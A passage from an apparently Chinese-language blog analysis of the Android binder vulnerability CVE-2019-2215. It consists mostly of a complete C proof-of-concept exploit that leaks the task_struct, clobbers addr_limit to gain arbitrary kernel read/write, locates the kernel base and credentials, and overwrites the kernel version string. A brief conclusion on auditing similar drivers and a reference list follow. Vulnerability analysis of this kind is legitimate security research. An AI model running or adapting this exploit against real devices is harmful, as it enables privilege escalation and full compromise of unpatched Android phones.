</span><span style="color:#75715e">#define IOVEC_INDX_FOR_WQ (WAITQUEUE_OFFSET / 16) </span><span style="color:#75715e">//10
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">hexdump_memory</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf, size_t byte_count) {
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> byte_offset_start <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
  <span style="color:#66d9ef">if</span> (byte_count <span style="color:#f92672">%</span> <span style="color:#ae81ff">16</span>)
    errx(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;hexdump_memory called with non-full line&#34;</span>);
  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> byte_offset <span style="color:#f92672">=</span> byte_offset_start; byte_offset <span style="color:#f92672">&lt;</span> byte_offset_start <span style="color:#f92672">+</span> byte_count;
          byte_offset <span style="color:#f92672">+=</span> <span style="color:#ae81ff">16</span>) {
    <span style="color:#66d9ef">char</span> line[<span style="color:#ae81ff">1000</span>];
    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>linep <span style="color:#f92672">=</span> line;
    linep <span style="color:#f92672">+=</span> sprintf(linep, <span style="color:#e6db74">&#34;%08lx  &#34;</span>, byte_offset);
    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">16</span>; i<span style="color:#f92672">++</span>) {
      linep <span style="color:#f92672">+=</span> sprintf(linep, <span style="color:#e6db74">&#34;%02hhx &#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>)buf[byte_offset <span style="color:#f92672">+</span> i]);
    }
    linep <span style="color:#f92672">+=</span> sprintf(linep, <span style="color:#e6db74">&#34; |&#34;</span>);
    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">16</span>; i<span style="color:#f92672">++</span>) {
      <span style="color:#66d9ef">char</span> c <span style="color:#f92672">=</span> buf[byte_offset <span style="color:#f92672">+</span> i];
      <span style="color:#66d9ef">if</span> (isalnum(c) <span style="color:#f92672">||</span> ispunct(c) <span style="color:#f92672">||</span> c <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39; &#39;</span>) {
        <span style="color:#f92672">*</span>(linep<span style="color:#f92672">++</span>) <span style="color:#f92672">=</span> c;
      } <span style="color:#66d9ef">else</span> {
        <span style="color:#f92672">*</span>(linep<span style="color:#f92672">++</span>) <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;.&#39;</span>;
      }
    }
    linep <span style="color:#f92672">+=</span> sprintf(linep, <span style="color:#e6db74">&#34;|&#34;</span>);
    puts(line);
  }
}

<span style="color:#66d9ef">int</span> epfd;

<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>dummy_page_4g_aligned;
<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> current_ptr;
<span style="color:#66d9ef">int</span> binder_fd;

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">leak_task_struct</span>(<span style="color:#66d9ef">void</span>)
{
  <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">epoll_event</span> event <span style="color:#f92672">=</span> { .events <span style="color:#f92672">=</span> EPOLLIN };
  <span style="color:#66d9ef">if</span> (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, <span style="color:#f92672">&amp;</span>event)) err(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;epoll_add&#34;</span>);

  <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">iovec</span> iovec_array[IOVEC_ARRAY_SZ];
  memset(iovec_array, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(iovec_array));

  iovec_array[IOVEC_INDX_FOR_WQ].iov_base <span style="color:#f92672">=</span> dummy_page_4g_aligned; <span style="color:#75715e">/* spinlock in the low address half must be zero */</span>
  iovec_array[IOVEC_INDX_FOR_WQ].iov_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1000</span>; <span style="color:#75715e">/* wq-&gt;task_list-&gt;next */</span>
  iovec_array[IOVEC_INDX_FOR_WQ <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>].iov_base <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0xDEADBEEF</span>; <span style="color:#75715e">/* wq-&gt;task_list-&gt;prev */</span>
  iovec_array[IOVEC_INDX_FOR_WQ <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>].iov_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1000</span>;

  <span style="color:#66d9ef">int</span> b;

  <span style="color:#66d9ef">int</span> pipefd[<span style="color:#ae81ff">2</span>];
  <span style="color:#66d9ef">if</span> (pipe(pipefd)) err(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;pipe&#34;</span>);
  <span style="color:#66d9ef">if</span> (fcntl(pipefd[<span style="color:#ae81ff">0</span>], F_SETPIPE_SZ, <span style="color:#ae81ff">0x1000</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x1000</span>) err(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;pipe size&#34;</span>);
  <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">char</span> page_buffer[<span style="color:#ae81ff">0x1000</span>];
  <span style="color:#75715e">//if (write(pipefd[1], page_buffer, sizeof(page_buffer)) != sizeof(page_buffer)) err(1, &#34;fill pipe&#34;);
</span><span style="color:#75715e"></span>
  pid_t fork_ret <span style="color:#f92672">=</span> fork();
  <span style="color:#66d9ef">if</span> (fork_ret <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) err(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;fork&#34;</span>);
  <span style="color:#66d9ef">if</span> (fork_ret <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>){
    <span style="color:#75715e">/* Child process */</span>
    prctl(PR_SET_PDEATHSIG, SIGKILL);
    sleep(<span style="color:#ae81ff">2</span>);
    printf(<span style="color:#e6db74">&#34;CHILD: Doing EPOLL_CTL_DEL.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, <span style="color:#f92672">&amp;</span>event);
    printf(<span style="color:#e6db74">&#34;CHILD: Finished EPOLL_CTL_DEL.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    <span style="color:#75715e">// first page: dummy data
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (read(pipefd[<span style="color:#ae81ff">0</span>], page_buffer, <span style="color:#66d9ef">sizeof</span>(page_buffer)) <span style="color:#f92672">!=</span> <span style="color:#66d9ef">sizeof</span>(page_buffer)) err(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;read full pipe&#34;</span>);
    close(pipefd[<span style="color:#ae81ff">1</span>]);
    printf(<span style="color:#e6db74">&#34;CHILD: Finished write to FIFO.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);

    exit(<span style="color:#ae81ff">0</span>);
  }
  <span style="color:#75715e">//printf(&#34;PARENT: Calling READV\n&#34;);
</span><span style="color:#75715e"></span>  ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
  b <span style="color:#f92672">=</span> writev(pipefd[<span style="color:#ae81ff">1</span>], iovec_array, IOVEC_ARRAY_SZ);
  printf(<span style="color:#e6db74">&#34;writev() returns 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)b);
  <span style="color:#75715e">// second page: leaked data
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (read(pipefd[<span style="color:#ae81ff">0</span>], page_buffer, <span style="color:#66d9ef">sizeof</span>(page_buffer)) <span style="color:#f92672">!=</span> <span style="color:#66d9ef">sizeof</span>(page_buffer)) err(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;read full pipe&#34;</span>);
  <span style="color:#75715e">//hexdump_memory((unsigned char *)page_buffer, sizeof(page_buffer));
</span><span style="color:#75715e"></span>
  printf(<span style="color:#e6db74">&#34;PARENT: Finished calling READV</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
  <span style="color:#66d9ef">int</span> status;
  <span style="color:#66d9ef">if</span> (wait(<span style="color:#f92672">&amp;</span>status) <span style="color:#f92672">!=</span> fork_ret) err(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;wait&#34;</span>);

  current_ptr <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(page_buffer <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xe8</span>);
  printf(<span style="color:#e6db74">&#34;current_ptr == 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, current_ptr);
}

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">clobber_addr_limit</span>(<span style="color:#66d9ef">void</span>)
{
  <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">epoll_event</span> event <span style="color:#f92672">=</span> { .events <span style="color:#f92672">=</span> EPOLLIN };
  <span style="color:#66d9ef">if</span> (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, <span style="color:#f92672">&amp;</span>event)) err(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;epoll_add&#34;</span>);

  <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">iovec</span> iovec_array[IOVEC_ARRAY_SZ];
  memset(iovec_array, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(iovec_array));

  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> second_write_chunk[] <span style="color:#f92672">=</span> {
    <span style="color:#ae81ff">1</span>, <span style="color:#75715e">/* iov_len */</span>
    <span style="color:#ae81ff">0xdeadbeef</span>, <span style="color:#75715e">/* iov_base (already used) */</span>
    <span style="color:#ae81ff">0x8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x10</span>, <span style="color:#75715e">/* iov_len (already used) */</span>
    current_ptr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>, <span style="color:#75715e">/* next iov_base (addr_limit) */</span>
    <span style="color:#ae81ff">8</span>, <span style="color:#75715e">/* next iov_len (sizeof(addr_limit)) */</span>
    <span style="color:#ae81ff">0xfffffffffffffffe</span> <span style="color:#75715e">/* value to write */</span>
  };

  iovec_array[IOVEC_INDX_FOR_WQ].iov_base <span style="color:#f92672">=</span> dummy_page_4g_aligned; <span style="color:#75715e">/* spinlock in the low address half must be zero */</span>
  iovec_array[IOVEC_INDX_FOR_WQ].iov_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>; <span style="color:#75715e">/* wq-&gt;task_list-&gt;next */</span>
  iovec_array[IOVEC_INDX_FOR_WQ <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>].iov_base <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0xDEADBEEF</span>; <span style="color:#75715e">/* wq-&gt;task_list-&gt;prev */</span>
  iovec_array[IOVEC_INDX_FOR_WQ <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>].iov_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x10</span>; <span style="color:#75715e">/* iov_len of previous, then this element and next element */</span>
  iovec_array[IOVEC_INDX_FOR_WQ <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>].iov_base <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0xBEEFDEAD</span>;
  iovec_array[IOVEC_INDX_FOR_WQ <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>].iov_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>; <span style="color:#75715e">/* should be correct from the start, kernel will sum up lengths when importing */</span>

  <span style="color:#66d9ef">int</span> socks[<span style="color:#ae81ff">2</span>];
  <span style="color:#66d9ef">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span style="color:#ae81ff">0</span>, socks)) err(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;socketpair&#34;</span>);
  <span style="color:#66d9ef">if</span> (write(socks[<span style="color:#ae81ff">1</span>], <span style="color:#e6db74">&#34;X&#34;</span>, <span style="color:#ae81ff">1</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span>) err(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;write socket dummy byte&#34;</span>);

  pid_t fork_ret <span style="color:#f92672">=</span> fork();
  <span style="color:#66d9ef">if</span> (fork_ret <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) err(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;fork&#34;</span>);
  <span style="color:#66d9ef">if</span> (fork_ret <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>){
    <span style="color:#75715e">/* Child process */</span>
    prctl(PR_SET_PDEATHSIG, SIGKILL);
    sleep(<span style="color:#ae81ff">2</span>);
    printf(<span style="color:#e6db74">&#34;CHILD: Doing EPOLL_CTL_DEL.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, <span style="color:#f92672">&amp;</span>event);
    printf(<span style="color:#e6db74">&#34;CHILD: Finished EPOLL_CTL_DEL.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    <span style="color:#66d9ef">if</span> (write(socks[<span style="color:#ae81ff">1</span>], second_write_chunk, <span style="color:#66d9ef">sizeof</span>(second_write_chunk)) <span style="color:#f92672">!=</span> <span style="color:#66d9ef">sizeof</span>(second_write_chunk))
      err(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;write second chunk to socket&#34;</span>);
    exit(<span style="color:#ae81ff">0</span>);
  }
  ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
  <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">msghdr</span> msg <span style="color:#f92672">=</span> {
    .msg_iov <span style="color:#f92672">=</span> iovec_array,
    .msg_iovlen <span style="color:#f92672">=</span> IOVEC_ARRAY_SZ
  };
  <span style="color:#66d9ef">int</span> recvmsg_result <span style="color:#f92672">=</span> recvmsg(socks[<span style="color:#ae81ff">0</span>], <span style="color:#f92672">&amp;</span>msg, MSG_WAITALL);
  printf(<span style="color:#e6db74">&#34;recvmsg() returns %d, expected %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, recvmsg_result,
      (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>)(iovec_array[IOVEC_INDX_FOR_WQ].iov_len <span style="color:#f92672">+</span>
      iovec_array[IOVEC_INDX_FOR_WQ <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>].iov_len <span style="color:#f92672">+</span>
      iovec_array[IOVEC_INDX_FOR_WQ <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>].iov_len));
}

<span style="color:#66d9ef">int</span> kernel_rw_pipe[<span style="color:#ae81ff">2</span>];
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">kernel_write</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> kaddr, <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>buf, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> len) {
  errno <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
  <span style="color:#66d9ef">if</span> (len <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x1000</span>) errx(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;kernel writes over PAGE_SIZE are messy, tried 0x%lx&#34;</span>, len);
  <span style="color:#66d9ef">if</span> (write(kernel_rw_pipe[<span style="color:#ae81ff">1</span>], buf, len) <span style="color:#f92672">!=</span> len) err(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;kernel_write failed to load userspace buffer&#34;</span>);
  <span style="color:#66d9ef">if</span> (read(kernel_rw_pipe[<span style="color:#ae81ff">0</span>], (<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)kaddr, len) <span style="color:#f92672">!=</span> len) err(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;kernel_write failed to overwrite kernel memory&#34;</span>);
}
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">kernel_read</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> kaddr, <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>buf, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> len) {
  errno <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
  <span style="color:#66d9ef">if</span> (len <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x1000</span>) errx(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;kernel writes over PAGE_SIZE are messy, tried 0x%lx&#34;</span>, len);
  <span style="color:#66d9ef">if</span> (write(kernel_rw_pipe[<span style="color:#ae81ff">1</span>], (<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)kaddr, len) <span style="color:#f92672">!=</span> len) err(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;kernel_read failed to read kernel memory&#34;</span>);
  <span style="color:#66d9ef">if</span> (read(kernel_rw_pipe[<span style="color:#ae81ff">0</span>], buf, len) <span style="color:#f92672">!=</span> len) err(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;kernel_read failed to write out to userspace&#34;</span>);
}
<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#a6e22e">kernel_read_ulong</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> kaddr) {
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> data;
  kernel_read(kaddr, <span style="color:#f92672">&amp;</span>data, <span style="color:#66d9ef">sizeof</span>(data));
  <span style="color:#66d9ef">return</span> data;
}
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">kernel_write_ulong</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> kaddr, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> data) {
  kernel_write(kaddr, <span style="color:#f92672">&amp;</span>data, <span style="color:#66d9ef">sizeof</span>(data));
}
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">kernel_write_uint</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> kaddr, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> data) {
  kernel_write(kaddr, <span style="color:#f92672">&amp;</span>data, <span style="color:#66d9ef">sizeof</span>(data));
}

<span style="color:#75715e">// Linux localhost 4.4.177-g83bee1dc48e8 #1 SMP PREEMPT Mon Jul 22 20:12:03 UTC 2019 aarch64
</span><span style="color:#75715e">// data from `pahole` on my own build with the same .config
</span><span style="color:#75715e"></span><span style="color:#75715e">#define OFFSET__task_struct__mm 0x520
</span><span style="color:#75715e">#define OFFSET__task_struct__cred 0x790
</span><span style="color:#75715e">#define OFFSET__mm_struct__user_ns 0x300
</span><span style="color:#75715e">#define OFFSET__uts_namespace__name__version 0xc7
</span><span style="color:#75715e"></span><span style="color:#75715e">// SYMBOL_* are relative to _head; data from /proc/kallsyms on userdebug
</span><span style="color:#75715e"></span><span style="color:#75715e">#define SYMBOL__init_user_ns 0x202f2c8
</span><span style="color:#75715e">#define SYMBOL__init_task 0x20257d0
</span><span style="color:#75715e">#define SYMBOL__init_uts_ns 0x20255c0
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>) {
  printf(<span style="color:#e6db74">&#34;Starting POC</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
  <span style="color:#75715e">//pin_to(0);
</span><span style="color:#75715e"></span>
  dummy_page_4g_aligned <span style="color:#f92672">=</span> mmap((<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x100000000UL</span>, <span style="color:#ae81ff">0x2000</span>, PROT_READ<span style="color:#f92672">|</span>PROT_WRITE, MAP_PRIVATE<span style="color:#f92672">|</span>MAP_ANONYMOUS, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>);
  <span style="color:#66d9ef">if</span> (dummy_page_4g_aligned <span style="color:#f92672">!=</span> (<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x100000000UL</span>)
    err(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;mmap 4g aligned&#34;</span>);
  <span style="color:#66d9ef">if</span> (pipe(kernel_rw_pipe)) err(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;kernel_rw_pipe&#34;</span>);

  binder_fd <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;/dev/binder&#34;</span>, O_RDONLY);
  epfd <span style="color:#f92672">=</span> epoll_create(<span style="color:#ae81ff">1000</span>);
  leak_task_struct();
  clobber_addr_limit();

  setbuf(stdout, NULL);
  printf(<span style="color:#e6db74">&#34;should have stable kernel R/W now</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);

  <span style="color:#75715e">/* in case you want to do stuff with the creds, to show that you can get them: */</span>
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> current_mm <span style="color:#f92672">=</span> kernel_read_ulong(current_ptr <span style="color:#f92672">+</span> OFFSET__task_struct__mm);
  printf(<span style="color:#e6db74">&#34;current-&gt;mm == 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, current_mm);
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> current_user_ns <span style="color:#f92672">=</span> kernel_read_ulong(current_mm <span style="color:#f92672">+</span> OFFSET__mm_struct__user_ns);
  printf(<span style="color:#e6db74">&#34;current-&gt;mm-&gt;user_ns == 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, current_user_ns);
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> kernel_base <span style="color:#f92672">=</span> current_user_ns <span style="color:#f92672">-</span> SYMBOL__init_user_ns;
  printf(<span style="color:#e6db74">&#34;kernel base is 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, kernel_base);
  <span style="color:#66d9ef">if</span> (kernel_base <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfffUL</span>) errx(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;bad kernel base (not 0x...000)&#34;</span>);
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> init_task <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> SYMBOL__init_task;
  printf(<span style="color:#e6db74">&#34;&amp;init_task == 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, init_task);
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> init_task_cred <span style="color:#f92672">=</span> kernel_read_ulong(init_task <span style="color:#f92672">+</span> OFFSET__task_struct__cred);
  printf(<span style="color:#e6db74">&#34;init_task.cred == 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, init_task_cred);
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> my_cred <span style="color:#f92672">=</span> kernel_read_ulong(current_ptr <span style="color:#f92672">+</span> OFFSET__task_struct__cred);
  printf(<span style="color:#e6db74">&#34;current-&gt;cred == 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, my_cred);

  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> init_uts_ns <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> SYMBOL__init_uts_ns;
  <span style="color:#66d9ef">char</span> new_uts_version[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;EXPLOITED KERNEL&#34;</span>;
  kernel_write(init_uts_ns <span style="color:#f92672">+</span> OFFSET__uts_namespace__name__version, new_uts_version, <span style="color:#66d9ef">sizeof</span>(new_uts_version));
}
</code></pre></td></tr></table>
</div>
</div><h2 id="3-conclusion">3. Conclusion</h2>
<p>CVE-2019-2215的问题在于binder这类提供通过设备文件访问其功能的内核驱动没有处理好其销毁过程中和epoll联动部分(同步销毁其在epoll中可能存在的引用)。针对此类问题，可以尝试扩展到其他类似的驱动模块上进行代码审计，审计点在于check是否同样存在没有同步销毁其于epoll中的引用的问题。</p>
<h2 id="4-reference">4. Reference</h2>
<ul>
<li><a href="https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html">https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html</a></li>
<li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1942">https://bugs.chromium.org/p/project-zero/issues/detail?id=1942</a></li>
<li><a href="https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=414885">https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=414885</a></li>
<li><a href="https://dayzerosec.com/posts/analyzing-androids-cve-2019-2215-dev-binder-uaf/">https://dayzerosec.com/posts/analyzing-androids-cve-2019-2215-dev-binder-uaf/</a></li>
</ul>

    </div>
    <div class="post-footer">
      
    </div>
  </article>

  </main>
</body>

</html>